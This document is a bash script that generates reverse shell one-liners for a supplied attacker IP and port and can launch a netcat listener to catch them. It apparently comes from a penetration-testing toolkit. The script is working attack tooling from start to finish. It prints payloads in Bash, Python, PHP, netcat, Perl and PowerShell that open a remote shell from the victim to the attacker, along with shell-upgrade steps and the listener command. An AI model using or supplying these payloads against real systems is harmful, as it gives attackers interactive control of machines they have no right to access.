#!/usr/bin/env bash
# revshell-helper.sh — generate reverse shell one-liners for your IP/port and
# (optionally) start the matching listener in the same step.
#
# Usage: ./revshell-helper.sh <lhost> <lport> [--listen]

set -euo pipefail

usage() { echo "Usage: $0 <lhost> <lport> [--listen]"; exit 1; }
[ $# -ge 2 ] || usage

LHOST="$1"
LPORT="$2"
LISTEN=0
[ "${3:-}" = "--listen" ] && LISTEN=1

cat <<EOF
=== Reverse shell one-liners for $LHOST:$LPORT ===

Bash:
  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

Bash (no -i, for restrictive shells):
  0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; sh <&196 >&196 2>&196

Python3:
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

PHP:
  php -r '\$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

Netcat (if -e supported):
  nc -e /bin/sh $LHOST $LPORT

Netcat (no -e, mkfifo trick):
  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f

Perl:
  perl -e 'use Socket;\$i="$LHOST";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PowerShell (Windows targets):
  powershell -nop -c "\$c=New-Object Net.Sockets.TCPClient('$LHOST',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1 | Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$sbb=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbb,0,\$sbb.Length);\$s.Flush()}"

=== Upgrade shell after catching it ===
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  (then) export TERM=xterm; Ctrl+Z; stty raw -echo; fg; reset

EOF

if [ "$LISTEN" -eq 1 ]; then
    if command -v rlwrap >/dev/null 2>&1; then
        echo "[*] Starting listener (rlwrap+nc) on $LPORT... Ctrl+C to stop."
        rlwrap nc -lvnp "$LPORT"
    else
        echo "[*] rlwrap not found (apt install rlwrap recommended for arrow-key history)."
        echo "[*] Starting listener (nc) on $LPORT... Ctrl+C to stop."
        nc -lvnp "$LPORT"
    fi
fi
